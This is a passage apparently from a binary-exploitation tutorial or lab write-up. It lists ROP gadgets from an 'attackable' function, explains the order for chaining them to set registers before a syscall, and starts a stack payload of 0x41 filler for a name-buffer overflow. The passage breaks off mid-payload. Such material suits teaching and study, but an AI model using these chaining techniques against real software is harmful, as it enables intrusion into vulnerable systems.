...
attackable:
    ...
    jmp rcx
    ret
    pop rdx                 // pop into rdx, but destroy rax
    pop rax                 //
    jmp rax                 //
    xor rcx, rcx
    mov rbx, rcx
    ...
    xor rcx, rcx
    ret
    mov rcx, rdx            // copy rdx into rcx, but destroy rbx
    mov ebx, 0x1            //
    ret                     //
    pop rbx                 // pop into rbx, but destroy rax
    xor rax, rbx            //
    ret
```
Taking the overwriting of other registers into account we first want to pop into rdx, copy that to rcx, pop into rbx, pop into rax, and then at last, we want to make the syscall. Using objdump again, we find the addresses off our jump points. And when we insert the values for the registers, we get this "stack.txt".
```
0x4141414141414141 fill name buffer
0x4141414141414141 fill name buffer
0x4141414141414141 fill name buffer
